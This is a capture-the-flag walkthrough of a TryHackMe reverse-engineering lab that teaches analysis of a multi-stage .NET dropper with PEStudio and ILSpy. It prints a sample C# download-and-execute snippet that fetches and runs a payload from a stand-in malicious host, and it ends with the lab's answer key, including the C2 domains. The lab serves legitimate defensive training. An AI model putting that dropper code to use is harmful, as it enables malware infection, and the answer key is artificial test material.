# TryHackMe Advent of Cyber - Day 21: HELP ME...I'm REVERSE ENGINEERING! 

McSkidy's alert dashboard detected an unusual security warning from a file-sharing web application built by Glitch. The alert originated from a suspicious binary file compiled with .NET, triggering McSkidy's investigation into its anomalous behavior. Glitch denied involvement but agreed to assist in analyzing the file.

### Learning Objectives:
- Understand the structure of a binary file.
- Differentiate between disassembly and decompiling.
- Gain familiarity with multi-stage binaries.
- Reverse engineer a multi-stage binary practically.

---

## Introduction to Reverse Engineering (RE)
Reverse engineering (RE) involves analyzing binaries to:
- Determine their functionality.
- Identify malicious behavior.
- Detect security vulnerabilities.

**Example:** In 2017, Marcus Hutchins reverse-engineered WannaCry ransomware, registering a domain that neutralized the attack globally.

### Binaries
Binaries are compiled files containing:
1. **Code Section**: Executable instructions for the CPU.
2. **Data Section**: Variables and resources (e.g., images).
3. **Import/Export Tables**: Referenced libraries for additional functionality.

### PE Structure
The suspicious file follows the Portable Executable (PE) structure, typical for Windows executables.

---

## Disassembly vs. Decompiling
Two primary reverse engineering techniques:

| Comparison       | Disassembly                          | Decompiling                        |
|------------------|--------------------------------------|-------------------------------------|
| **Readability**  | Requires assembly knowledge.         | Easier for those familiar with high-level languages. |
| **Output Level** | Exact machine instructions.          | High-level approximation of logic. |
| **Difficulty**   | Higher due to detailed instructions. | Lower, but may lose some details.  |
| **Usefulness**   | Full behavior study with effort.     | Quick logic understanding.         |

---

## Multi-Stage Binaries
Attackers often use multi-stage binaries:
1. **Stage 1 - Dropper**: Checks system conditions and downloads further payloads.
2. **Stage 2 - Payload**: Performs the attack (e.g., encryption).

Advantages of multi-stage binaries:
- Evades detection by appearing less harmful initially.
- Grants attackers control over attack progression.

---

## Investigating the Suspicious Binary
### Initial Analysis
1. **Navigate to File**: Locate `WarevilleApp.exe` in the machine’s Desktop folder.
2. **File Details**:
   - Right-click and select **Properties**.
   - Confirm file extension (.exe) and architecture type (e.g., x64).

3. **Analyze with PEStudio**:
   - Open PEStudio and load the file.
   - Document:
     - **SHA-256 hash** for identification.
     - Key sections like `.text` containing executable code.
   - Review indicators such as URLs, IP addresses, or suspicious strings.

### Static Analysis
Focus on identifying:
- URLs and IP addresses.
- Function calls or crypto wallets in strings.

---

## Dynamic Analysis
### Decompiling with ILSpy
1. Open ILSpy from the taskbar.
2. Load the binary `WarevilleApp.exe`.
3. Review code structure in the left panel.
4. Analyze the `Main` function for logic and flow:
   - Identify variables and their assignments.
   - Observe actions like file downloads, executions, or interactions.

### Sample Code Analysis
For example:
```csharp
private static void Main(string[] args)
{
    Console.WriteLine("Analyzing suspicious binary...");
    string url = "http://malicious-site.com/payload.exe";
    string path = "C:\\Users\\Administrator\\Downloads\\payload.exe";

    using (WebClient webClient = new WebClient())
    {
        webClient.DownloadFile(url, path);
        Process.Start(path);
    }
    Console.WriteLine("Execution completed.");
}
```
**Flow**:
1. Downloads a file from a malicious URL.
2. Saves it locally and executes it.

---

## Execution Testing
**Important:** Execute the binary only in a sandbox environment. Observe:
- Console messages.
- File downloads and their behavior.

---

## Next Steps
Work with McSkidy to:
1. Complete static and dynamic analysis.
2. Identify malicious behavior.
3. Document findings for mitigation strategies.

**Tools Used**:
- PEStudio
- ILSpy

---

## Questions

1. What is the function name that downloads and executes files in the WarevilleApp.exe?
    >DownloadAndExecuteFile
2. Once you execute the WarevilleApp.exe, it downloads another binary to the Downloads folder. What is the name of the binary?
    >explorer.exe
3. What domain name is the one from where the file is downloaded after running WarevilleApp.exe?
    >mayorc2.thm
4. The stage 2 binary is executed automatically and creates a zip file comprising the victim's computer data; what is the name of the zip file?
    >CollectedFiles.zip
5. What is the name of the C2 server where the stage 2 binary tries to upload files?
    >anonymousc2.thm